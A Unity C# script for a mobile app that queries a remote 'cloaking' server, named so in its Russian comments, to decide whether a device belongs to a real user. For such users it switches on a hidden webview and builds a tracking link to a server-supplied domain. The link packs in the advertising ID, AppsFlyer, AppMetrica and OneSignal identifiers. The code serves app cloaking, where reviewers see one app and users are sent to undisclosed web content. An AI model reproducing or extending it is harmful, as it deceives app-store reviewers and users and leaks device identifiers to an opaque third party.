using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Web;
using AppsFlyerSDK;
using Facebook.Unity;
using Ugi.PlayInstallReferrerPlugin;
using UnityEditor;
using UnityEngine;
using UnityEngine.Networking;

public class DataFetcher : MonoBehaviour
{
    private AppsFlyerObjectScript _appsFlyer;
    public GameObject webView;
    public string cloUrl;
    private string _jsonCloResponse;

    private const string IsUserKey = "IsUser";
    private const string JsonResponseKey = "JsonInfo";
    private const string TrackLinkKey = "track_link";
    private void Start()
    {
        if(PlayerPrefs.HasKey(JsonResponseKey))
        {
            //готовая ссылка
           WorkWithStatusInfo();
        }
        else
        {
            Debug.Log(PlayerPrefs.HasKey(JsonResponseKey));
/*RequestCloData(() =>
{
    WorkWithStatusInfo();
})*/
            //StartCoroutine(RequestCloData(cloUrl ,SaveJsonResult));
        }
    }

    private void WorkWithStatusInfo()
    {
         _jsonCloResponse = PlayerPrefs.GetString(JsonResponseKey);
                    Debug.Log(IsUser(_jsonCloResponse));
        
                    webView.SetActive(IsUser(_jsonCloResponse));
    }

    #region CloRequest
    private CloData SerializeCloData(string cloResponse)
    {
        //if (string.IsNullOrEmpty(cloResponse)) return null;
        
        return JsonUtility.FromJson<CloData>(cloResponse);
    }
    private IEnumerable RequestCloData(Action cloDataCallback)
    {
        //запрашиваем ответ клоаки
        var webRequest = UnityWebRequest.Get(cloUrl);
        // Request and wait for the desired page.
        yield return webRequest.SendWebRequest();
        
        string cloResponse = webRequest.downloadHandler.text;
        
        CloData cloData = SerializeCloData(cloResponse);
        
        var preSave = new Action(delegate
        {
            SaveStatusInfo(SerializeCloData(cloResponse)); 
            cloDataCallback.Invoke();
        });
        
        if (webRequest.isNetworkError || webRequest.isHttpError)
        {
            Debug.Log(": Error: " + webRequest.error);
        }

        if (cloData == null || !cloData.user)
        {
            preSave.Invoke();
            yield break;
        }

        if (cloData.deeplink)
        {
            // Если клоака запрашивает проверку диплинка – проверяем
            RequestTrackLinkDataFromDeepLink(deepLinkData =>
            {
                // Если есть диплинк – генерируем ссылку
                if (deepLinkData != null)
                {
                    GenerateLink(cloData, deepLinkData, preSave);
                    return;
                }
                // Иначе переходим к неймингу
                CheckNamingOrCreateOrganicData(cloData,preSave);
            });
        }
        else
        {
            // Иначе переходим к неймингу
            CheckNamingOrCreateOrganicData(cloData,preSave);
        }
    }
    #endregion
    
    #region Naming
    private void CheckNamingOrCreateOrganicData(CloData cloData, Action namingOrOrganicDataCallback)
    {
        if (cloData.naming)
        {
            RequestTrackLinkDataFromNaming(cloData.media_sources, (namingData) => 
            {
                if (namingData != null)
                {
                    GenerateLink(cloData,namingData,namingOrOrganicDataCallback);
                }

                if (cloData.organic?.org_status == true)
                {
                    GenerateOrganicData(cloData, namingOrOrganicDataCallback);
                }
                else
                {
                    cloData.user = false;
                    PlayerPrefs.SetString(TrackLinkKey,"none");
                    PlayerPrefs.Save();
                    
                    namingOrOrganicDataCallback.Invoke();
                }
            });
        }
        else
        {
            if (cloData?.organic?.org_status == true)
            {
                GenerateOrganicData(cloData,namingOrOrganicDataCallback);
            }
            else
            {
                cloData.user = false;
                PlayerPrefs.SetString(TrackLinkKey,"none");
                PlayerPrefs.Save();
                    
                namingOrOrganicDataCallback.Invoke();
            }
        }
    }

    private void GenerateOrganicData(CloData cloData, Action generateOrganicDataCallback)
    {
        var organicData = new TrackLinkData
        {
            key = cloData.organic?.org_key ?? "none",
            sub1 = cloData.organic?.sub1 ?? "none",
            sub2 = cloData.organic?.sub2 ?? "none",
            sub3 = cloData.organic?.sub3 ?? "none",
            source = "none"
        };
        GenerateLink(cloData,organicData,generateOrganicDataCallback);
    }

    private void RequestTrackLinkDataFromNaming(List<MediaSource> mediaSources, Action<TrackLinkData> trackLinkCallback)
    {
        var conversionData = _appsFlyer.conversionDataDictionary;
        if(GetTrackLink() == null) return;
        if (conversionData.ContainsKey("media_source"))
        {
            if (mediaSources != null)
            {
                foreach (var source in mediaSources)
                {
                    if ((string) conversionData["media_source"] == source.media_source)
                    {
                        string key;
                        if (source.key.split)
                        {
                            var position = conversionData[source.key.name].ToString().Split(source.key.delimiter)
                                .GetValue(source.key.position);
                            key = (position ?? "none") as string;
                        }
                        else
                        {
                            key = (conversionData[source.key.name] == null ? "none" : conversionData[source.key.name]) as string;
                        }
                        
                        string sub1;
                        if (source.sub1.split)
                        {
                            var position = conversionData[source.sub1.name].ToString().Split(source.sub1.delimiter)
                                .GetValue(source.sub1.position);
                            sub1 = (position ?? "none") as string;
                        }
                        else
                        {
                            sub1 = (conversionData[source.sub1.name] == null ? "none" : conversionData[source.sub1.name]) as string;
                        }
                        
                        string sub2;
                        if (source.sub2.split)
                        {
                            var position = conversionData[source.sub2.name].ToString().Split(source.sub2.delimiter)
                                .GetValue(source.sub2.position);
                            sub2 = (position ?? "none") as string;
                        }
                        else
                        {
                            sub2 = (conversionData[source.sub2.name] == null ? "none" : conversionData[source.sub2.name]) as string;
                        }
                        string sub3;
                        if (source.sub3.split)
                        {
                            var position = conversionData[source.sub3.name].ToString().Split(source.sub3.delimiter)
                                .GetValue(source.sub3.position);
                            sub3 = (position ?? "none") as string;
                        }
                        else
                        {
                            sub3 = (conversionData[source.sub3.name] == null ? "none" : conversionData[source.sub3.name]) as string;
                        }

                        var tracklink = new TrackLinkData
                        {
                            key = key,
                            sub1 = sub1,
                            sub2 = sub2,
                            sub3 = sub3,
                            source = source.source
                        };

                        trackLinkCallback(tracklink);
                        return;
                    }
                }

                trackLinkCallback(null);
            }
            else
            {
                trackLinkCallback(null);
            }
        }
    }

    private string GetTrackLink()
    {
        return PlayerPrefs.HasKey(TrackLinkKey) ? PlayerPrefs.GetString(TrackLinkKey): null;
    }
    #endregion
    
    #region Deeplink
    private void RequestTrackLinkDataFromDeepLink(Action<TrackLinkData> trackLinkCallback)
    {
        FB.Mobile.FetchDeferredAppLinkData(appLinkResult =>
        {
            if (appLinkResult?.TargetUrl == null)
            {
                trackLinkCallback(null);
            }
            else
            {
                var query = HttpUtility.ParseQueryString(appLinkResult.TargetUrl);
                var key = query.Get("key") ?? "NoKey";
                var sub1  = query.Get("sub1") ?? "NoSub1";
                var sub2 = query.Get("sub2") ?? "NoSub2";
                var sub3 = query.Get("sub3") ?? "NoSub3";
                
                trackLinkCallback(new TrackLinkData{key = key,source = "fb",sub1 = sub1,sub2 = sub2,sub3 = sub3});
            }
            //var resultUrl = !string.IsNullOrEmpty(appLinkResult.Url) ? appLinkResult.Url : null;
            //trackLinkCallback(JsonUtility.FromJson<TrackLinkData>(resultUrl));
        });
    }

    private void GenerateLink(CloData cloData, TrackLinkData trackLinkData, Action linkGeneratedCallback)
    {
        RequestAdvertiserId(advertiserId =>
        {
            RequestAppMetricaDeviceId((metricaId,error) =>
            {
                var queryMap = new Dictionary<string,string>();

                queryMap["key"] = trackLinkData.key;

                if (!string.IsNullOrEmpty(trackLinkData.sub1))
                    queryMap["sub1"] = trackLinkData.sub1;
                if (!string.IsNullOrEmpty(trackLinkData.sub2))
                    queryMap["sub2"] = trackLinkData.sub2;
                if (!string.IsNullOrEmpty(trackLinkData.sub3))
                    queryMap["sub3"] = trackLinkData.sub3;

                var appsflyerId = AppsFlyer.getAppsFlyerId();

                if (cloData.integration_version == "v1")
                {
                    var sub5 = $"{trackLinkData.source}:${advertiserId}:${appsflyerId}:${metricaId}";

                    queryMap["sub4"] = Application.identifier;
                    queryMap["sub5"] = sub5;
                }
                else
                {
                    queryMap["bundle"] = Application.identifier;
                    queryMap["metrica_id"] = metricaId;
                    queryMap["apps_id"] = appsflyerId;
                    queryMap["ifa"] = advertiserId;
                    
                    var subscriptionOneSignalStatus = OneSignal.GetPermissionSubscriptionState();
                    queryMap["onesignal_id"] = string.IsNullOrEmpty(subscriptionOneSignalStatus.subscriptionStatus.userId)?
                        "none" : subscriptionOneSignalStatus.subscriptionStatus.userId;
                    queryMap["source"] = trackLinkData.source;
                }

                var trackLink = $"https://{cloData.domain}/click.php";

                var index = 0;
                foreach (var pair in queryMap)
                {
                    trackLink += index == 0 ? "?" : "&";

                    trackLink += $"{pair.Key}={queryMap[pair.Key]}";
                    index++;
                }
                PlayerPrefs.SetString(TrackLinkKey, trackLink);
                PlayerPrefs.Save();

                linkGeneratedCallback();
            });
        });
    }

    private void RequestAppMetricaDeviceId(Action<string, YandexAppMetricaRequestDeviceIDError?> metricaIdCallback)
    {
        AppMetrica.Instance.RequestAppMetricaDeviceID(metricaIdCallback ?? ((s, error) => metricaIdCallback("none", YandexAppMetricaRequestDeviceIDError.INVALID_RESPONSE)));
    }
    private void RequestAdvertiserId(Action<string> advertiserIdCallback)
    {
        Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            {
                if (string.IsNullOrEmpty(advertisingId))
                {
                    Debug.Log ("advertisingId error :" + error);
                    advertiserIdCallback("none");
                }
                else
                    advertiserIdCallback(advertisingId);
            }
        );
    }
    #endregion
    private void SaveStatusInfo(CloData cloInfo)
    {
        if(cloInfo == null) return;
        
        PlayerPrefs.SetInt(IsUserKey, BoolToInt(cloInfo.user));
        PlayerPrefs.Save();
    }

    #region TODO
    private void SaveJsonResult(string jsonResult)
    {
        if (string.IsNullOrEmpty(jsonResult))
        {
            Debug.Log("Json response is null or empty");
        }
        else
        {
            PlayerPrefs.SetString(JsonResponseKey, jsonResult);
            PlayerPrefs.Save();
            
            _jsonCloResponse = jsonResult;
            webView.SetActive(IsUser(_jsonCloResponse));
        }
    }
    private static bool IsUser(string json)
    {
        if (PlayerPrefs.HasKey(IsUserKey))
        {
            return PlayerPrefs.GetInt(IsUserKey) != 0;
        }

        var data = JsonUtility.FromJson<CloData>(json);
        
        PlayerPrefs.SetInt(IsUserKey, data.user ? 1 : 0);
        PlayerPrefs.Save();
        
        Debug.Log(PlayerPrefs.GetInt(IsUserKey) != 0);
        return PlayerPrefs.GetInt(IsUserKey) != 0;
    }



    private string GetInstallReferrer()
    {
        string referrer = null;
        PlayInstallReferrer.GetInstallReferrerInfo(installReferrerDetails =>
        {
            // check for error
            if (installReferrerDetails.Error != null)
            {
                Debug.LogError("Error occurred!");
                if (installReferrerDetails.Error.Exception != null)
                {
                    Debug.LogError("Exception message: " + installReferrerDetails.Error.Exception.Message);
                }
                Debug.LogError("Response code: " + installReferrerDetails.Error.ResponseCode);
                return;
            }
            referrer = installReferrerDetails.InstallReferrer;
        });

        return referrer;
    }


    #endregion

    #region PlayerPrefsBoolCast
    private int BoolToInt(bool val)
    {
        return val ? 1 : 0;
    }

    private bool IntToBool(int val)
    {
        return val != 0;
    }

    #endregion
}
public static class ObjectExtensions 
{
    // Kotlin: fun <T, R> T.let(block: (T) -> R): R
    public static R Let<T, R>(this T self, Func<T, R> block) 
    {
        return block(self);
    }

    // Kotlin: fun <T> T.also(block: (T) -> Unit): T
    public static T Also<T>(this T self, Action<T> block)
    {
        block(self);
        return self;
    }   
}
public class CloData
{
    public bool naming;
    public bool deeplink;
    public string integration_version;
    public string domain;
    public Organic organic;
    public bool user;
    public List<MediaSource> media_sources;
}

public class TrackLinkData
{
    public string key;
    public string sub1;
    public string sub2;
    public string sub3;
    public string source;
}
public class MediaSource
{
    public string source;
    public string media_source;
    public KeyOrSub key;
    public KeyOrSub sub1;
    public KeyOrSub sub2;
    public KeyOrSub sub3;
}

public class KeyOrSub
{
    public string name;
    public bool split;
    public char delimiter;
    public int position;
}

public class Organic
{
    public bool org_status;
    public string org_key;
    public string sub1;
    public string sub2;
    public string sub3;
}
